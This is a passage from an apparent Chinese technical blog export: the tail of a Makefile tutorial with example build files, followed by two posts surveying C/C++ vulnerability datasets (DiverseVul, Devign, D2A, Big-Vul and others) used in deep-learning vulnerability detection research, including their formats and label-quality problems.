class="line">hellocpp:$&#123;OBJ1&#125;</span><br><span class="line">@echo &quot;============开始编译============&quot;</span><br><span class="line">g++ -o $@ $?</span><br><span class="line">@rm -f $&#123;OBJ1&#125;</span><br><span class="line">@mv $@ $&#123;BIN&#125;</span><br><span class="line">@echo &quot;============编译结束============&quot;</span><br><span class="line">@echo &quot;&quot;</span><br><span class="line"></span><br><span class="line">#C编译</span><br><span class="line">hello:$&#123;OBJ2&#125;</span><br><span class="line">@echo &quot;============开始编译============&quot;</span><br><span class="line">gcc -o $@ $?</span><br><span class="line">@rm -f $&#123;OBJ2&#125;</span><br><span class="line">@mv $@ $&#123;BIN&#125;</span><br><span class="line">@echo &quot;============编译结束============&quot;</span><br><span class="line">@echo &quot;&quot;</span><br></pre></td></tr></table></figure><p>命令前加@，表示当前命令不显示，最后编译结果是这样。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261000869.jpeg" alt="img"></p><p>Makefile编译结果</p><p>以上是Makefile的全部内容，本文完结。</p><hr><p>分享几个Makefile的示例DEMO，</p><p>编译SOCKET服务，使用mysql数据库。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261000964.webp" alt="img"></p><p>编译socket服务</p><p>Makefile代码如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#socket服务端编译(用到mysql数据库)</span><br><span class="line">INCL=-I/usr/local/mysql/include -I$(HOME)/incl</span><br><span class="line">LIB=-L/usr/local/mysql/lib -lmysqlclient -lmysqld -lmysqlservices -L$(HOME)/lib -lbanktest</span><br><span class="line">BINDIR=$(HOME)/bin</span><br><span class="line"></span><br><span class="line">.SUFFIXES: .cpp .c</span><br><span class="line"></span><br><span class="line">.cpp.o:</span><br><span class="line">g++ $&#123;INCL&#125; -c $&lt;</span><br><span class="line"></span><br><span class="line">.c.o:</span><br><span class="line">gcc $(INCL) -c $&lt;</span><br><span class="line"></span><br><span class="line">all: clean server</span><br><span class="line"></span><br><span class="line">server:server.o</span><br><span class="line">@echo &quot;============开始编译============&quot;</span><br><span class="line">gcc -o $@ $? $(LIB)</span><br><span class="line">@mv $@ $(BINDIR)</span><br><span class="line">@echo &quot;============编译结束============&quot;</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">@rm -f *.o</span><br></pre></td></tr></table></figure><p>编译des md5 base64密码服务的Makefile</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">#编译des md5 base64密码服务</span><br><span class="line">INCL=-I/usr/local/mysql/include -I$(HOME)/incl</span><br><span class="line">LIB=-L/usr/local/mysql/lib -lmysqlclient -lmysqld -lmysqlservices</span><br><span class="line">BINDIR=$(HOME)/bin</span><br><span class="line">LIBDIR=$(HOME)/lib</span><br><span class="line"></span><br><span class="line">.SUFFIXES: .cpp .c</span><br><span class="line"></span><br><span class="line">.cpp.o:</span><br><span class="line">g++ $&#123;INCL&#125; -c $&lt;</span><br><span class="line">.c.o:</span><br><span class="line">gcc $(INCL) -c $&lt;</span><br><span class="line"></span><br><span class="line">all: clean des md5 base64</span><br><span class="line"></span><br><span class="line">des:des.o main_des.o</span><br><span class="line">gcc -o $@ $? $(LIB)</span><br><span class="line">mv $@ $(BINDIR)</span><br><span class="line"></span><br><span class="line">md5:md5.o main_md5.o</span><br><span class="line">gcc -o $@ $? $(LIB)</span><br><span class="line">mv $@ $(BINDIR)</span><br><span class="line"></span><br><span class="line">base64test:base64.o main_base64.o</span><br><span class="line">gcc -o $@ $? $(LIB)</span><br><span class="line">mv $@ $(BINDIR)</span><br><span class="line"></span><br><span class="line">rsa:rsa.o main_rsa.o</span><br><span class="line">gcc -o $@ $? $(LIB)</span><br><span class="line">mv $@ $(BINDIR)</span><br><span class="line"></span><br><span class="line">libjiami.a:des.o md5.o base64.o</span><br><span class="line">ar -r $@ $?</span><br><span class="line">mv $@ $(LIBDIR)</span><br><span class="line"></span><br><span class="line">libdestest:main_des.o</span><br><span class="line">gcc -o $@ $? $(LIB) -L$(HOME)/lib -ljiami</span><br><span class="line">mv $@ $(BINDIR)</span><br><span class="line"></span><br><span class="line">libtest.so:des.c md5.c base64.c</span><br><span class="line">gcc -o $@ -fPIC -shared $?</span><br><span class="line">mv $@ $(LIBDIR)</span><br><span class="line"></span><br><span class="line">libmd5test:main_md5.o</span><br><span class="line">gcc -o $@ $? $(LIB) -L$(HOME)/lib -ltest</span><br><span class="line">mv $@ $(BINDIR)</span><br><span class="line"></span><br><span class="line">libbanktest.a:banktest.o banksql.o</span><br><span class="line">ar -r $@ $?</span><br><span class="line">mv $@ $(LIBDIR)</span><br><span class="line"></span><br><span class="line">banktest:banktest.o banksql.o</span><br><span class="line">gcc -o $@ $? $(LIB) -L$(HOME)/lib -ltest</span><br><span class="line">mv $@ $(BINDIR)</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">rm -f *.o</span><br></pre></td></tr></table></figure><p>最后，加几点写Makefile的注意事项</p><p>\1. tab分隔，不能用空格。</p><p>\2. 每个makefile最好加一个all</p><p>\3. 注释用“#”符号</p><p>\4. 文件指示，引用其他的makefile文件</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C/C++漏洞数据集的特点</title>
      <link href="/2024/04/18/Security/Vulnerability%20datasets(C_C++)/"/>
      <url>/2024/04/18/Security/Vulnerability%20datasets(C_C++)/</url>
      
        <content type="html"><![CDATA[<p>关于数据集，文献<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>发现了一些问题：</p><ul><li><p>深度学习模型在漏洞检测上能够成功的一个重要条件是庞大的漏洞代码数据样本的支撑，我们需要大规模数据集来可靠评估深度学习方法对漏洞检测的影响，随着可用培训数据量的增加，不同架构的相对性能会发生根本性变化。</p></li><li><p><strong>LLMs比GNNs更能够利用大规模数据集</strong>：**更大的数据集仅轻微提高了ReVeal的表现，但显著提高了LLMs的表现。**然而，我们的实验表明，通过收集更多数据来提高性能可能已经停滞。**与普遍认为对于LLMs表现良好，模型大小是最重要因素不同，我们的结果显示，最重要的因素可能是LLM的训练方式。**在代码理解任务的预训练似乎能够带来很大的改善。我们认为开发更好的代码特定预训练任务是改善基于深度学习的漏洞检测的一个有前途的研究方向。</p></li><li><p>此外，我们**确定了一个部署基于深度学习模型的重要泛化挑战。**要部署一个模型，我们需要检测新软件项目中的漏洞，这些漏洞在训练集中没有出现。我们发现，在这种情况下，深度学习模型表现非常糟糕。然而，在实践中，我们经常希望在新项目上运行漏洞检测工具，因此在训练集中不会有该项目的任何漏洞。所有模型在未见项目上的性能显著下降，例如，在已见项目上的F1分数从49%降至未见项目上的仅9.4％。原因不明；也许模型过度拟合了特定于出现在训练集中的特定项目的模式或编码习惯。</p></li></ul><h2 id="synthetic-datasets-合成数据集">Synthetic Datasets (合成数据集)</h2><p>SATE IV Juliet <sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup> 和 SARD <sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup> 是之前论文中使用的常见合成数据集。**SARD 扩展了Juliet v1.0 测试套件，包含多种编程语言的测试用例。**这些测试用例的准确性很高，而且包含各种 CWE。不过，这些测试用例是利用已知的易受攻击模式孤立构建的，旨在评估静态和动态分析工具。它们并不能完全捕捉真实世界项目中的复杂漏洞。VulDeePecker数据集只关注两个 CWE。他们根据国家漏洞数据库（NVD）<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup> 中的 CVE 信息从 19 个项目中选取了漏洞，并将这两个 CWE 中的SARD测试用例合并在一起。VulDeePecker 和 SARD 都是半合成数据集。</p><h2 id="static-analyzer-labels">Static Analyzer Labels</h2><p>Draper <sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup> 数据集是使用来自三个静态分析器（Clang、Cppcheck和Flawfinder）的警告生成的标签。**一些类别的警告被标记为脆弱，而一些被映射为非脆弱。**标记的数据集是在函数级别进行的。<strong>标签的质量未知，但静态分析器的标签准确度往往较低。</strong> D2A <sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup> 对静态分析器（Infer）在六个开源存储库上输出的差异分析。<u>对于github存储库的成千上万个版本对，如果静态分析器为git提交前的版本生成警告，但在提交之后不生成警告，则D2A将该提交视为修复漏洞。对于其余的警告，D2A将它们标记为与漏洞无关。</u></p><h2 id="manual-labeling">Manual Labeling</h2><p>Devign <sup class="footnote-ref"><a href="#fn7" id="fnref7">[7]</a></sup> 数据集由三名安全研究人员进行标记。他们首先使用关键词从四个存储库中查找可能修复漏洞和与漏洞无关的提交。然后，对于第一类别，三名安全研究人员通过多数票手动审查这些提交，确定哪些修复了安全漏洞。给定每个提交的标签后，Devign提取提交前的更改函数作为数据样本，并根据提交的标签将其标记为易受攻击或非易受攻击。Devign的作者发布了两个存储库，FFMPeg和Qemu的数据。**这个数据集具有高质量的标签，但手动标记非常昂贵，**耗费了大约600人时。</p><h2 id="security-issues">Security Issues</h2><p>先前的几个数据集是通过爬取安全问题来生成的，以识别漏洞修复提交。ReVeal<sup class="footnote-ref"><a href="#fn8" id="fnref8">[8]</a></sup>数据集是使用来自Chromium安全问题和Debian安全跟踪器的补丁进行标记的。ReVeal将安全补丁（提交）前的更改函数视为易受攻击的，补丁后的函数视为不易受攻击，所有未更改的函数被视为不易受攻击。</p><p>BigVul<sup class="footnote-ref"><a href="#fn9" id="fnref9">[9]</a></sup>，CrossVul <sup class="footnote-ref"><a href="#fn10" id="fnref10">[10]</a></sup>和CVEfixes <sup class="footnote-ref"><a href="#fn11" id="fnref11">[11]</a></sup>从NVD <sup class="footnote-ref"><a href="#fn4" id="fnref4:1">[4:1]</a></sup>的通用漏洞和漏洞记录中收集漏洞修复提交。特别是，CVEFixes涵盖截至2022年8月27日的所有已发布CVE。CVEfixes和CrossVul数据集涵盖多种编程语言，这三个数据集涵盖了广泛的项目和CWEs。</p><p>其他一些 C/C++ 漏洞源代码数据集没有提供漏洞函数，因此我们没有将其纳入实验。例如，AOSP <sup class="footnote-ref"><a href="#fn12" id="fnref12">[12]</a></sup> 从 Android 开源项目（AOSP）的安全公告中收集了修复 CVE 的提交，其中包含 Android 操作系统、Linux 内核和芯片上系统制造商的漏洞补丁。</p><p>PatchDB <sup class="footnote-ref"><a href="#fn13" id="fnref13">[13]</a></sup> 提供了补丁信息，即代码差异，但没有提供足够的信息来识别它来自哪个项目或 git 仓库，因此无法让我们重建更改功能的完整代码。</p><h2 id="diversevul">DiverseVul</h2><p>要想让深度学习取得成功，我们需要一个大型的漏洞源代码数据集。我们发布了一个新的开放式 C/C++ 漏洞数据集 DiverseVul。为了整理这个数据集，我们抓取安全问题网站，收集漏洞报告，提取每个漏洞的漏洞修复提交，克隆相应的项目，并从中提取有漏洞和无漏洞的源代码。我们的数据集包含从 7,514 次提交中提取的 18,945 个易受攻击函数和 330,492 个非易受攻击函数，涵盖 150 个 CWE。这比之前最大、最多样化的数据集 CVEFixes <sup class="footnote-ref"><a href="#fn11" id="fnref11:1">[11:1]</a></sup> 中的 C/C++ 数据量大两倍多。</p><p>我们的数据集更加多样化，涵盖的项目比之前发布的所有数据集的总和多出近 50%。我们向社区公开发布了 DiverseVul 数据集，网址是 https：<a href="//github.com/wagner-group/diversevul%E3%80%82">//github.com/wagner-group/diversevul。</a></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202501101546709.png" alt="image-20250110154626664"></p><h2 id="references">References</h2><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p>DiverseVul: A New Vulnerable Source Code Dataset for Deep Learning Based Vulnerability Detection. <a href="#fnref1" class="footnote-backref">↩︎</a></p></li><li id="fn2" class="footnote-item"><p>Vadim Okun, Aurelien Delaitre, Paul E Black, et al. 2013. Report on the static analysis tool exposition (sate) iv. NIST Special  Publication 500 (2013), 297. <a href="#fnref2" class="footnote-backref">↩︎</a></p></li><li id="fn3" class="footnote-item"><p>National Institute of Standards and Technology. Last accessed on March 19, 2023. NIST Software Assurance Reference Dataset. <a href="https://samate.nist.gov/SARD">https://samate.nist.gov/SARD</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p></li><li id="fn4" class="footnote-item"><p>National Institute of Standards and Technology. Last accessed on March 19, 2023. National Vulnerability Database. <a href="https://nvd.nist.gov/">https://nvd.nist.gov/</a> <a href="#fnref4" class="footnote-backref">↩︎</a> <a href="#fnref4:1" class="footnote-backref">↩︎</a></p></li><li id="fn5" class="footnote-item"><p>Rebecca Russell, Louis Kim, Lei Hamilton, Tomo Lazovich, Jacob  Harer, Onur Ozdemir, Paul Ellingwood, and Marc McConley. 2018. Automated vulnerability detection in source code using deep representation  learning. In 2018 17th IEEE international conference on machine learning and applications (ICMLA). IEEE, 757–762. <a href="#fnref5" class="footnote-backref">↩︎</a></p></li><li id="fn6" class="footnote-item"><p>Yunhui Zheng, Saurabh Pujar, Burn Lewis, Luca Buratti, Edward  Epstein, Bo Yang, Jim Laredo, Alessandro Morari, and Zhong Su. 2021.  D2A: a dataset built for AI-based vulnerability detection methods using  differential analysis. In 2021 IEEE/ACM 43rd International Conference on Software Engineering: Software Engineering in Practice (ICSE-SEIP).  IEEE, 111–120. <a href="#fnref6" class="footnote-backref">↩︎</a></p></li><li id="fn7" class="footnote-item"><p>Yaqin Zhou, Shangqing Liu, Jingkai Siow, Xiaoning Du, and Yang  Liu. 2019. Devign: Effective vulnerability identification by learning  comprehensive program semantics via graph neural networks. Advances in  neural information processing systems 32 (2019). <a href="#fnref7" class="footnote-backref">↩︎</a></p></li><li id="fn8" class="footnote-item"><p>Saikat Chakraborty, Rahul Krishna, Yangruibo Ding, and Baishakhi  Ray. 2021. Deep learning based vulnerability detection: Are we there  yet. IEEE Transactions on Software Engineering (2021). <a href="#fnref8" class="footnote-backref">↩︎</a></p></li><li id="fn9" class="footnote-item"><p>Jiahao Fan, Yi Li, Shaohua Wang, and Tien N Nguyen. 2020. A C/C++  code vulnerability dataset with code changes and CVE summaries. In  Proceedings of the 17th International Conference on Mining Software  Repositories. 508–512. <a href="#fnref9" class="footnote-backref">↩︎</a></p></li><li id="fn10" class="footnote-item"><p>Georgios Nikitopoulos, Konstantina Dritsa, Panos Louridas, and  Dimitris Mitropoulos. 2021. CrossVul: a cross-language vulnerability  dataset with commit data. In Proceedings of the 29th ACM Joint Meeting  on European Software Engineering Conference and Symposium on the  Foundations of Software Engineering. 1565–1569. <a href="#fnref10" class="footnote-backref">↩︎</a></p></li><li id="fn11" class="footnote-item"><p>Guru Bhandari, Amara Naseer, and Leon Moonen. 2021. CVEfixes:  automated collection of vulnerabilities and their fixes from open-source software. In Proceedings of the 17th International Conference on  Predictive Models and Data Analytics in Software Engineering. 30–39. <a href="#fnref11" class="footnote-backref">↩︎</a> <a href="#fnref11:1" class="footnote-backref">↩︎</a></p></li><li id="fn12" class="footnote-item"><p>Alexis Challande, Robin David, and Guénaël Renault. 2022. Building a Commitlevel Dataset of Real-world Vulnerabilities. In Proceedings of the Twelveth ACM Conference on Data and Application Security and Privacy. 101–106. <a href="#fnref12" class="footnote-backref">↩︎</a></p></li><li id="fn13" class="footnote-item"><p>Xinda Wang, Shu Wang, Pengbin Feng, Kun Sun, and Sushil Jajodia. 2021. Patchdb: A large-scale security patch dataset. In 2021 51st Annual IEEE/IFIP International Conference on Dependable Systems and Networks (DSN). IEEE, 149–160. <a href="#fnref13" class="footnote-backref">↩︎</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
            <tag> VulDataset </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C/C++漏洞数据集</title>
      <link href="/2024/04/18/Security/C_C++%E6%BC%8F%E6%B4%9E%E6%95%B0%E6%8D%AE%E9%9B%86/"/>
      <url>/2024/04/18/Security/C_C++%E6%BC%8F%E6%B4%9E%E6%95%B0%E6%8D%AE%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_44370676/article/details/118198912#2_136">C/C++漏洞数据集-CSDN博客</a></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202501101543800.png" alt="image-20250110154313738"></p><h2 id="1常用数据集">1.常用数据集</h2><h3 id="11big-vul">1.1.Big-Vul</h3><p>论文地址：<a href="https://dl.acm.org/doi/10.1145/3379597.3387501">A C/C++ Code Vulnerability Dataset with Code Changes and CVE Summaries</a></p><p><a href="https://github.com/ZeoVan/MSR_20_Code_vulnerability_CSV_Dataset">github地址</a></p><p>该数据集存储为csv格式。包含了漏洞行号信息，详细参考github地址。</p><p><a href="https://github.com/ZeoVan/MSR_20_Code_vulnerability_CSV_Dataset">https://github.com/ZeoVan/MSR_20_Code_vulnerability_CSV_Dataset</a></p><h3 id="12reveal">1.2.Reveal</h3><p>Reveal本为一个DLVD（Deep Learning Vulnerbility Detection）方法，可以参考<a href="https://blog.csdn.net/qq_44370676/article/details/118223852">Reveal</a>。而作者收集了一个数据集。从Linux <a href="https://so.csdn.net/so/search?q=Debian&amp;spm=1001.2101.3001.7020">Debian</a> Kernel 和Chromium的vulnerabilitiy fixed patches中构造。</p><p>论文地址：<a href="https://arxiv.org/abs/2009.07235">Deep Learning based Vulnerability Detection:Are We There Yet?</a></p><p><a href="https://drive.google.com/drive/folders/1KuIYgFcvWUXheDhT--cBALsfy1I4utOy">数据集下载地址</a></p><p>包含2个json，vulnerables.json和non-vulnerables.json。json的key包括</p><ul><li>code:源代码内容</li><li>hash</li><li>project</li><li>size</li></ul><p>遗憾的是，该数据集不包括漏洞行号信息。</p><h3 id="13ffmpegqemu">1.3.FFMPeg+Qemu</h3><p>又称Devign数据集</p><p><a href="https://drive.google.com/file/d/1x6hoF7G-tSYxg8AFybggypLZgMGDNHfF/edit">数据集下载地址</a></p><p>数据集为一个function.json，包括4个key。</p><ul><li>project：FFmpeg或者Qemu</li><li>commit_id</li><li>target：0或者1，是否有漏洞</li><li>func：一个函数的代码内容，包括函数定义那一行</li></ul><p>遗憾的是，该数据集也不包括漏洞行号信息。</p><h3 id="14d2a">1.4.D2A</h3><p>论文地址：<a href="https://arxiv.org/pdf/2102.07995.pdf">D2A: A Dataset Built for AI-Based Vulnerability<br>Detection Methods Using Differential Analysis</a></p><p>github地址：<a href="https://github.com/ibm/D2A">D2A</a></p><p><a href="https://developer.ibm.com/exchanges/data/all/d2a/">数据集下载地址</a></p><p>数据集下下来为pickle文件，需要注意的是，这里的标记并不是简单的将一个function标为0或1，而是有一个trace，记录bug触发的路径，会涉及到多个function。</p><p>以libtiff Sample Dataset为例，加载2020-09-10_libtiff_labeler_1.pickle文件，打开发现是一个dict，有下面几个key</p><ul><li>id：值为libtiff_d888dddf8807829fc0f9f3bbdb0a64871c29b05b_1</li><li>label：值为1，该文件全是标记为1的数据</li><li>label_source：auto_labeler</li><li>bug_type：PULSE_MEMORY_LEAK</li><li>project：libtiff</li><li>bug_info：为1个dict，key包括<ul><li>qualifier：bug信息</li><li>file：源文件</li><li>procedure</li><li>line</li><li>column</li><li>url</li></ul></li><li>adjusted_bug_loc</li><li>bug_loc_trace_index</li><li>versions</li><li>sample_type：before_fix</li><li>trace：为1个list，记录该fix涉及到的function行号</li><li>functions：记录bug trace的function完整的代码</li><li>commit</li><li>compiler_args：为dict，记录每个文件用什么编译器编译</li><li>zipped_bug_report：由Infer产生的原始bug报告。</li></ul><p>论文给出的示例如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&#123;   </span><br><span class="line">   <span class="attr">&quot;id&quot;:</span> <span class="string">&quot;httpd_9b3a5f0ffd8ec787cf645f97902582acb3234d96_1&quot;</span>,   </span><br><span class="line">   <span class="attr">&quot;label&quot;:</span> <span class="number">1</span>,   </span><br><span class="line">   <span class="attr">&quot;label_source&quot;:</span> <span class="string">&quot;auto_labeler&quot;</span>,   </span><br><span class="line">   <span class="attr">&quot;bug_type&quot;:</span> <span class="string">&quot;BUFFER_OVERRUN_U5&quot;</span>,   </span><br><span class="line">   <span class="attr">&quot;project&quot;:</span> <span class="string">&quot;httpd&quot;</span>,   </span><br><span class="line">   <span class="attr">&quot;bug_info&quot;:</span> &#123;   </span><br><span class="line">     <span class="attr">&quot;qualifier&quot;:</span> <span class="string">&quot;Offset: [0, +oo] Size: 10 by call to ...&quot;</span>,   </span><br><span class="line">     <span class="attr">&quot;loc&quot;:</span> <span class="string">&quot;modules/proxy/mod_proxy_fcgi.c:178:31&quot;</span>,   </span><br><span class="line">     <span class="attr">&quot;url&quot;:</span> <span class="string">&quot;https://github.com/apache/httpd/blob/...&quot;</span>   </span><br><span class="line">   &#125;,   </span><br><span class="line">   <span class="attr">&quot;versions&quot;:</span> &#123;   </span><br><span class="line">     <span class="attr">&quot;before&quot;:</span> <span class="string">&quot;545d85acdaa384a25ee5184a8ee671a18ef5582f&quot;</span>,   </span><br><span class="line">     <span class="attr">&quot;after&quot;:</span> <span class="string">&quot;2c70ed756286b2adf81c55473077698d6d6d16a1&quot;</span>   </span><br><span class="line">   &#125;,   </span><br><span class="line">   <span class="attr">&quot;trace&quot;:</span> [   </span><br><span class="line">     &#123;   </span><br><span class="line">       <span class="attr">&quot;description&quot;:</span> <span class="string">&quot;Array declaration&quot;</span>,   </span><br><span class="line">       <span class="attr">&quot;loc&quot;:</span> <span class="string">&quot;modules/proxy/mod_proxy_fcgi.c:178:31&quot;</span>,   </span><br><span class="line">       <span class="attr">&quot;func_key&quot;:</span> <span class="string">&quot;modules/proxy/mod_proxy_fcgi.c@167:1-203:2&quot;</span>,   </span><br><span class="line">     &#125;   </span><br><span class="line">   ],   </span><br><span class="line">   <span class="attr">&quot;functions&quot;:</span> &#123;   </span><br><span class="line">     <span class="string">&quot;modules/proxy/mod_proxy_fcgi.c@167:1-203:2&quot;</span><span class="string">:</span> &#123;   </span><br><span class="line">       <span class="attr">&quot;name&quot;:</span> <span class="string">&quot;fix_cgivars&quot;</span>,   </span><br><span class="line">       <span class="attr">&quot;touched_by_commit&quot;:</span> <span class="literal">true</span>,   </span><br><span class="line">       <span class="attr">&quot;code&quot;:</span> <span class="string">&quot;static void fix_cgivars(request_rec *r, ...&quot;</span>   </span><br><span class="line">     &#125;   </span><br><span class="line">   &#125;,   </span><br><span class="line">   <span class="attr">&quot;commit&quot;:</span> &#123;   </span><br><span class="line">     <span class="attr">&quot;url&quot;:</span> <span class="string">&quot;https://github.com/apache/httpd/commit/2c70ed7&quot;</span>,   </span><br><span class="line">     <span class="attr">&quot;changes&quot;:</span> [   </span><br><span class="line">       &#123;   </span><br><span class="line">         <span class="attr">&quot;before&quot;:</span> <span class="string">&quot;modules/proxy/mod_proxy_fcgi.c&quot;</span>,   </span><br><span class="line">         <span class="attr">&quot;after&quot;:</span> <span class="string">&quot;modules/proxy/mod_proxy_fcgi.c&quot;</span>,   </span><br><span class="line">         <span class="attr">&quot;changes&quot;:</span> [<span class="string">&quot;177,1^^177,5&quot;</span>]   </span><br><span class="line">       &#125;   </span><br><span class="line">     ]   </span><br><span class="line">   &#125;,   </span><br><span class="line">   <span class="attr">&quot;compiler_args&quot;:</span> &#123;   </span><br><span class="line">     <span class="attr">&quot;modules/proxy/mod_proxy_fcgi.c&quot;:</span> <span class="string">&quot;-D_REENTRANT -I./server ...&quot;</span>,   </span><br><span class="line">   &#125;,   </span><br><span class="line">   <span class="attr">&quot;zipped_bug_report&quot;:</span> <span class="string">&quot;...&quot;</span>   </span><br><span class="line">&#125; </span><br><span class="line"><span class="number">1234567891011121314151617181920212223242526272829303132333435363738394041424344</span></span><br></pre></td></tr></table></figure><h3 id="15-diversevul">1.5 DiverseVul</h3><p>Yizheng Chen, Zhoujie Ding, Lamya Alowain, Xinyun Chen, and David A. Wagner. 2023. DiverseVul: A New Vulnerable Source Code Dataset for Deep Learning Based Vulnerability Detection. In Proceedings of the 26th International Symposium on Research in Attacks, Intrusions and Defenses (RAID). ACM, 654–668.</p><h2 id="2数据集质量研究">2.数据集质量研究</h2><p>在ICSE 23关于漏洞数据集的paper <a href="https://arxiv.org/pdf/2301.05456.pdf">Data Quality for Software Vulnerability Datasets</a>中，调研的数据集如下表所示：</p><table><thead><tr><th>数据集</th><th>标注来源</th><th>function数量</th><th>漏洞function占比</th></tr></thead><tbody><tr><td>Big-Vul</td><td>CVE databas</td><td>188636</td><td>5.78%</td></tr><tr><td>Devign</td><td>开发者标注</td><td>27318</td><td>45.61%</td></tr><tr><td>D2A</td><td>工具标注</td><td>1295623</td><td>1.44%</td></tr><tr><td>Juliet</td><td>合成</td><td>253002</td><td>36.77%</td></tr></tbody></table><p>作者统计了可能导致标注不准确的原因：</p><ul><li>Irrelevant code change: 数据集标注器假设漏洞修复（vulnerability-fix）所涉及的代码是易受攻击的代码（function）。然而，漏洞修复commit可能不一定只包括修复补丁。可能还存在非功能性更改，如样式更改、重构和代码迁移，可能会混淆数据标记过程。比如FFMpeg中<a href="https://github.com/FFmpeg/FFmpeg/commit/8b2fce0d3f5a56c40c28899c9237210ca8f9cf75#diff73395d3a1e02aad201d2af860c5bf0fc9cb6a68c9c711ff226eeb24ea0d409a5L400">libswscale/swscale.c</a>的commit仅仅是将常量变成定义的宏。</li><li>Cleanup changes: 漏洞修复可能包括增加、删除或者修改变量，这些是与漏洞修复相关的功能更改，但是它们并没有指示触发行的位置。</li><li>Inaccurate vulnerability fix identification: 如果标注器无法识别漏洞修复，那么随后的代码片段自然不会是漏洞。像Big Vul这样从外部漏洞报告中跟踪漏洞修复的数据集可能会在这个过程中引入错误。比如<ul><li>作者发现<a href="https://so.csdn.net/so/search?q=Chromium&amp;spm=1001.2101.3001.7020">Chromium</a>项目的大多数漏洞报告都被不正确地跟踪，因为这个存储库不是通过GitHub自然托管的。</li><li>而此外，有些标注器（Devign和D2A）试图直接从提交commit历史记录中识别漏洞修复的数据集，这个过程同样可能导致错误标注。D2A用静态分析工具Infer标注数据集同样可能引入错误。</li></ul></li></ul><p>对于来源自真实环境的数据集，作者的分析结果如下：</p><table><thead><tr><th>数据集</th><th>Irrelevant</th><th>Cleanup</th><th>Inaccurate</th></tr></thead><tbody><tr><td>Big-Vul</td><td>25%</td><td>28.1%</td><td>46.9%</td></tr><tr><td>Devign</td><td>42.9%</td><td>21.4%</td><td>35.7%</td></tr><tr><td>D2A</td><td>0</td><td>0</td><td>100%</td></tr></tbody></table><ul><li>Devign由于引入人工校验，所以不准确度相对低，但是其数据量也很小。</li><li>Big-Vul的主要问题是从commit中提取了不相关的code change，尤其是来自Chromium的commit，36%的entry都来自Chromium。</li><li>D2A所标注的commit大部分都不是真正的漏洞commit。</li></ul><p>除了对数据集的准确性评估，作者还评估了数据集独特性（存不存在重复样本）、一致性（存不存在标签冲突的样本）、完整性问题。</p>]]></content>
      
      
